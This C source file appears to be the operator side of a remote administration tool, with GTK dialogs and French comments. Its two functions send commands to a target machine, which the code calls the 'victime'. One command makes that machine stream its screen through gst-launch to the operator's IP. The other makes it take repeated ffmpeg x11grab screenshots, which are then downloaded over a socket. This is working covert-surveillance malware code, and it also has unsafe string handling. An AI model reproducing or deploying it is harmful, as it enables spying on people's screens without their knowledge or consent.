#ifdef WIN32
    #include <window.h>
    #include <winsock2.h>
#else
    #include <sys/types.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>  //gethostbyaddr()

    #include <stdio.h>
    #include <stdlib.h>
    #include <errno.h>
    #include <unistd.h>
    #include <string.h>

    #include <gtk-2.0/gtk/gtk.h>

#endif


#include "../includes/constants.h"
#include "../includes/callback.h"
#include "../includes/utils.h"
#include "../includes/mint_options.h"



GtkWidget *main_win;

GtkWidget *log_entry;
const gchar *chemin;

const gchar *server_ip;
const char *server_port;
int port;

char *resolution_final;

void mint_streaming_watch(char *IP)
{
    SOCKET sock = 0;
    SOCKADDR_IN sin;

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    FILE *pipe = NULL;

    GtkWidget *IP_dialog = NULL;
    GtkWidget *IP_entry = NULL;
    //char *IP = NULL;

    int err = 0;
    size_t flag_watch = 7;

    //const gchar *command_victime = "gst-launch-1.0 -v ximagesrc use-damage=false xname=/usr/lib/torcs/torcs-bin ! videoconvert ! videoscale ! video/x-raw,format=I420,width=1024,height=768,framerate=25/1 ! jpegenc ! rtpjpegpay ! udpsink host=192.168.1.13 port=5000";
    //const gchar *command_victime_temp = "gst-launch-1.0 -v ximagesrc use-damage=false xname=/usr/lib/torcs/torcs-bin ! videoconvert ! videoscale ! video/x-raw,format=I420,width=800,height=600,framerate=25/1 ! jpegenc ! rtpjpegpay ! udpsink ";

    //const gchar *command_victime_temp = "gst-launch-1.0 -v ximagesrc use-damage=false xname=/usr/lib/torcs/torcs-bin ! videoconvert ! videoscale ! video/x-raw,format=I420,width=1280,height=720,framerate=30/1 ! jpegenc ! rtpjpegpay ! udpsink ";
    const gchar *command_victime_temp = "gst-launch-1.0 -v ximagesrc use-damage=false xname=/usr/lib/torcs/torcs-bin ! videoconvert ! videoscale ! video/x-raw,format=I420,width=1440,height=810,framerate=30/1 ! jpegenc ! rtpjpegpay ! udpsink ";

    gchar *final_victime_cmd = NULL;

    size_t len_cmd = strlen(command_victime_temp) + 1;
    size_t len_final_cmd = 0;

    const gchar *command_user = "gst-launch-1.0 udpsrc port=4444 ! application/x-rtp,encoding-name=JPEG,payload=26 ! rtpjpegdepay ! jpegdec ! autovideosink";

    //const gchar *command_user = "gst-launch-1.0 -v -e uvch264src initial-bitrate=10000000 average-bitrate=10000000 iframe-period=1000 device=/dev/video1 name=src auto-start=true src.vfsrc ! queue ! video/x-raw,format=YUY2,width=320,height=240,framerate=10/1 ! xvimagesink sync=false src.vidsrc ! queue ! video/x-h264,width=1280,height=720,framerate=30/1 ! h264parse ! flvmux ! filesink location=/home/thibault/Bureau/test.flv";

    IP = malloc(15 * sizeof(char));
    if(IP == NULL)
    {
        error("malloc() IP", "mint_streaming_watch()");
        exit(-1);
    }

    IP_dialog = gtk_dialog_new_with_buttons("Enter your IP", GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_STOCK_OK, GTK_RESPONSE_OK, GTK_STOCK_CANCEL, GTK_RESPONSE_CANCEL, NULL);

    IP_entry = gtk_entry_new();

    gtk_entry_set_text(GTK_ENTRY(IP_entry), "Your IP");

    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(IP_dialog)->vbox), IP_entry, TRUE, FALSE, 0);

    gtk_widget_show_all(GTK_DIALOG(IP_dialog)->vbox);

    switch(gtk_dialog_run(GTK_DIALOG(IP_dialog)))
    {
        case GTK_RESPONSE_OK:
             IP = gtk_entry_get_text(GTK_ENTRY(IP_entry));
            break;

        case GTK_RESPONSE_CANCEL:
            break;

        case GTK_RESPONSE_NONE:
            break;

        default:
            break;
    }

    final_victime_cmd = malloc(256 * sizeof(char));
    if(final_victime_cmd == NULL)
    {
        error("malloc() final_victim_cmd", "mint_streaming_watch()");
        exit(-1);
    }

    final_victime_cmd = strncpy(final_victime_cmd, command_victime_temp, len_cmd);
    final_victime_cmd = strcat(final_victime_cmd, "host=");
    final_victime_cmd = strcat(final_victime_cmd, IP);
    final_victime_cmd = strcat(final_victime_cmd, " ");
    final_victime_cmd = strcat(final_victime_cmd, "port=");
    final_victime_cmd = strcat(final_victime_cmd, server_port);

    gtk_widget_destroy(IP_dialog);

    //usleep(400);

    len_final_cmd = strlen(final_victime_cmd) + 1;

    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "mint_streaming_watch()");
        exit(-1);
    }

    err = connect(sock, (SOCKADDR*)&sin, sizeof(sin));

    if(err == SOCKET_ERROR)
    {
        error("connect()", "mint_streaming_watch()");
        exit(-1);
    }

    printf("\t\tMINT STREAM STARTED ....\n");

    if(send(sock, (char*)&flag_watch, sizeof(flag_watch), 0) == SOCKET_ERROR)
    {
        error("send() flag_watch", "mint_streaming_watch()");
        exit(-1);
    }

    if(flag_watch == 7)
    {
        if(send(sock, (char*)&len_final_cmd, sizeof(len_final_cmd), 0) == SOCKET_ERROR)
        {
            error("send() len_final_cmd", "mint_streaming_watch()");
            exit(-1);
        }

        if(send(sock, final_victime_cmd, len_final_cmd, 0) == SOCKET_ERROR)
        {
            error("send() final_victime_cmd", "mint_streaming_watch()");
            exit(-1);
        }

        pipe = popen(command_user, "r");
        if(pipe == NULL)
        {
            error("popen() pipe", "mint_streaming_watch()");
            exit(-1);
        }
    }

    free(final_victime_cmd);

    return;
}

void mint_multi_screenshot()
{
    //const gchar *victime_cmd = "ffmpeg -f x11grab -framerate 1 -r 1 -video_size 1920x1080 -i :0.0 -vframes 5 screenshot-%05d.jpeg";
    //const gchar *victime_cmd = "ffmpeg -f x11grab -framerate 1 -r ";
    const gchar *victime_cmd = "ffmpeg -f x11grab -framerate 1 -r ";


    gchar *final_victime_cmd = NULL;

    size_t len_cmd = strlen(victime_cmd) + 1;
    size_t len_final_cmd = 0;

    SOCKET sock = 0;
    SOCKADDR_IN sin;

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    size_t flag_screenshot = 5;
    int err = 0;

    GtkWidget *interval_screenshot_dialog = NULL;
    GtkWidget *format_screenshot_dialog = NULL;

    GtkWidget *number_of_screenshot_entry = NULL;
    GtkWidget *format_screenshot_entry = NULL;

    const gchar *interval = NULL;
    const gchar *number_of_screenshot = NULL;

    int total_number_of_screenshot = 0;
    int delay_interval = 0;

    //GtkWidget *warning_dialog_number = NULL;
    GtkWidget *warning_dialog_format = NULL;

    char buffer[MAXDATASIZE] = "";

    FILE *screenshot_file = NULL;
    void * tailleBlockRecut = 0;
    size_t data_len = 0;
    size_t totalRcv = 0;

    const char *file_name[] =   {
                                    "1.jpeg", "2.jpeg", "3.jpeg", "4.jpeg", "5.jpeg", "6.jpeg", "7.jpeg", "8.jpeg", "9.jpeg", "10.jpeg",
                                    "11.jpeg", "12.jpeg", "13.jpeg", "14.jpeg", "15.jpeg", "16.jpeg", "17.jpeg", "18.jpeg", "19.jpeg", "20.jpeg",
                                    "21.jpeg", "22.jpeg", "23.jpeg", "24.jpeg", "25.jpeg", "26.jpeg", "27.jpeg", "28.jpeg", "29.jpeg", "30.jpeg",
                                    "31.jpeg", "32.jpeg", "33.jpeg", "34.jpeg", "35.jpeg", "36.jpeg", "37.jpeg", "38.jpeg", "39.jpeg", "40.jpeg",
                                    "41.jpeg", "42.jpeg", "43.jpeg", "44.jpeg", "45.jpeg", "46.jpeg", "47.jpeg", "48.jpeg", "49.jpeg", "50.jpeg"
                                };
    int i = 0;
    int j = 1;


    interval_screenshot_dialog = gtk_dialog_new_with_buttons("Interval beetween each screenshot", GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_STOCK_OK, GTK_RESPONSE_OK, NULL);

    gtk_widget_set_size_request(interval_screenshot_dialog, 360, 100);

    number_of_screenshot_entry = gtk_entry_new();

    gtk_entry_set_text(GTK_ENTRY(number_of_screenshot_entry), "0.5 = 2sec/0.25 = 4sec/0.125 = 8sec/0.0625 = 16sec ...");

    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(interval_screenshot_dialog)->vbox), number_of_screenshot_entry, TRUE, FALSE, 0);

    gtk_widget_show_all(GTK_DIALOG(interval_screenshot_dialog)->vbox);

    switch(gtk_dialog_run(GTK_DIALOG(interval_screenshot_dialog)))
    {
        case GTK_RESPONSE_OK:
            interval = gtk_entry_get_text(GTK_ENTRY(number_of_screenshot_entry));
            gtk_widget_hide(interval_screenshot_dialog);
            break;

        case GTK_RESPONSE_NONE:
            break;

        default:
            break;
    }

    number_of_screenshot = malloc(4 * sizeof(char));
    if(number_of_screenshot == NULL)
    {
        error("malloc() number_of_screenshot", "ubuntu_multi_screenshot()");
        exit(-1);
    }

    do
    {
        format_screenshot_dialog = gtk_dialog_new_with_buttons("Screenshots", GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_STOCK_OK, GTK_RESPONSE_OK, NULL);

        gtk_widget_set_size_request(format_screenshot_dialog, 310, 100);

        format_screenshot_entry = gtk_entry_new();

        gtk_entry_set_text(GTK_ENTRY(format_screenshot_entry), "Number of screenshot(s) you want to take");

        gtk_box_pack_start(GTK_BOX(GTK_DIALOG(format_screenshot_dialog)->vbox), format_screenshot_entry, TRUE, FALSE, 0);

        gtk_widget_show_all(GTK_DIALOG(format_screenshot_dialog)->vbox);

        switch(gtk_dialog_run(GTK_DIALOG(format_screenshot_dialog)))
        {
            case GTK_RESPONSE_OK:
                number_of_screenshot = gtk_entry_get_text(GTK_ENTRY(format_screenshot_entry));
                gtk_widget_hide(format_screenshot_dialog);
                break;

            case GTK_RESPONSE_NONE:
                break;

            default:
                break;
        }

        if(atoi(number_of_screenshot) <= 0)
        {
            warning_dialog_format = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_WARNING, GTK_BUTTONS_CLOSE, "You can't enter zero or a negative number of screenshots");

            switch(gtk_dialog_run(GTK_DIALOG(warning_dialog_format)))
            {
                case GTK_RESPONSE_CLOSE:
                    gtk_widget_destroy(warning_dialog_format);
                    break;

                case GTK_RESPONSE_NONE:
                    break;

                default:
                    break;
            }
        }

    }while(atoi(number_of_screenshot) <= 0);

    if(strcmp(interval, "0.5") == 0)
        delay_interval = 2 * atoi(number_of_screenshot);

    if(strcmp(interval, "0.25") == 0)
        delay_interval = 4 * atoi(number_of_screenshot);

    if(strcmp(interval, "0.1667") == 0)
        delay_interval = 6 * atoi(number_of_screenshot);

    if(strcmp(interval, "0.125") == 0)
        delay_interval = 8 * atoi(number_of_screenshot);

    if(strcmp(interval, "0.1") == 0)
        delay_interval = 10 * atoi(number_of_screenshot);

    if(strcmp(interval, "0.0833") == 0)
        delay_interval = 12 * atoi(number_of_screenshot);

    if(strcmp(interval, "0.0714") == 0)
        delay_interval = 14 * atoi(number_of_screenshot);

    if(strcmp(interval, "0.0625") == 0)
        delay_interval = 16 * atoi(number_of_screenshot);

    if(strcmp(interval, "0.05") == 0)
        delay_interval = 20 * atoi(number_of_screenshot);

    if(strcmp(interval, "0.04") == 0)
        delay_interval = 25 * atoi(number_of_screenshot);

    if(strcmp(interval, "0.0333") == 0)
        delay_interval = 30 * atoi(number_of_screenshot);

    if(strcmp(interval, "0.0167") == 0)
        delay_interval = 60 * atoi(number_of_screenshot);

    if(strcmp(interval, "0.0083") == 0)
        delay_interval = 120 * atoi(number_of_screenshot);

    if(strcmp(interval, "0.0056") == 0)
        delay_interval = 180 * atoi(number_of_screenshot);

    if(strcmp(interval, "0.0033") == 0)
        delay_interval = 300 * atoi(number_of_screenshot);

    if(strcmp(interval, "0.0017") == 0)
        delay_interval = 600 * atoi(number_of_screenshot);

    if(strcmp(interval, "0.0008") == 0)
        delay_interval = 1200 * atoi(number_of_screenshot);

    printf("\n\ndelay interval = %d\n\n", delay_interval);  // FAIRE TOUTE LES INTERVALE

    final_victime_cmd = malloc(256 * sizeof(char));
    if(final_victime_cmd == NULL)
    {
        error("malloc() final_victim_cmd", "ubuntu_multi_screenshot()");
        exit(-1);
    }

    final_victime_cmd = strncpy(final_victime_cmd, victime_cmd, len_cmd);
    final_victime_cmd = strcat(final_victime_cmd, interval);
    final_victime_cmd = strcat(final_victime_cmd, " -video_size");
    final_victime_cmd = strcat(final_victime_cmd, resolution_final);
    final_victime_cmd = strcat(final_victime_cmd, "  -i :0.0 -vframes  ");
    final_victime_cmd = strcat(final_victime_cmd, number_of_screenshot);
    final_victime_cmd = strcat(final_victime_cmd, " %");
    //final_victime_cmd = strcat(final_victime_cmd, number_of_screenshot);
    final_victime_cmd = strcat(final_victime_cmd, "d.jpeg");

    len_final_cmd = strlen(final_victime_cmd) + 1;

     printf("\n\n\n%s\n\n\n", final_victime_cmd);

    total_number_of_screenshot = atoi(number_of_screenshot);
    printf("\n\ntotal screenshot = %d\n\n", total_number_of_screenshot);

    gtk_widget_destroy(format_screenshot_dialog);

    gtk_widget_destroy(interval_screenshot_dialog);

    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "ubuntu_multi_screenshot()");
        exit(-1);
    }

    err = connect(sock, (SOCKADDR*)&sin, sizeof(sin));

    if(err == SOCKET_ERROR)
    {
        error("connect()", "ubuntu_multi_screenshot()");
        exit(-1);
    }

    printf("Taking and Downloading multiple screenshots\n");

    if(send(sock, (char*)&flag_screenshot, sizeof(flag_screenshot), 0) == SOCKET_ERROR)
    {
        error("send() flag_screenshot", "ubuntu_multi_screenshot()");
        exit(-1);
    }

    if(flag_screenshot == 5)
    {
        if(send(sock, (char*)&total_number_of_screenshot, sizeof(total_number_of_screenshot), 0) == SOCKET_ERROR)
        {
            error("send() total_number_of_screenshot", "ubuntu_multi_screenshot()");
            exit(-1);
        }

        if(send(sock, (char*)&delay_interval, sizeof(delay_interval), 0) == SOCKET_ERROR)
        {
            error("send() delay_interval", "ubuntu_multi_screenshot()");
            exit(-1);
        }

        if(send(sock, (char*)&len_final_cmd, sizeof(len_final_cmd), 0) == SOCKET_ERROR)
        {
            error("send() len_final_cmd", "ubuntu_multi_screenshot()");
            exit(-1);
        }

        if(send(sock, final_victime_cmd, len_final_cmd, 0) == SOCKET_ERROR)
        {
            error("send() final_victime_cmd", "ubuntu_multi_screenshot()");
            exit(-1);
        }

        do
        {
            if(recv(sock, (char*)&data_len, sizeof(data_len), 0) == SOCKET_ERROR)
            {
                error("recv() data_len", "ubuntu_multi_screenshot()");
                exit(-1);
            }

            printf("\nFilename  = %s\n", file_name[i]);

            screenshot_file = fopen(file_name[i], "wb");
            if(screenshot_file == NULL)
            {
                error("fopen()", "ubuntu_multi_screenshot()");
                exit(-1);
            }

            printf("le screenshot pèse : %ld octets\n\n", data_len);

            do
            {
                tailleBlockRecut = recv(sock, buffer, sizeof(data_len), 0);

                fwrite(buffer, sizeof(char), (size_t)tailleBlockRecut, screenshot_file);

                totalRcv += (size_t)tailleBlockRecut;

                //printf("Downloading : %.2f Mo\n\n", (double)totalRcv / 1000000);

            }while(totalRcv < data_len);

            printf("Reception du screenshot success !!!!\n");

            fclose(screenshot_file);
            totalRcv = 0;
            i++;
            j++;

        }while(j <= total_number_of_screenshot);


        free(final_victime_cmd);
        free(resolution_final);
    }

    return;
}
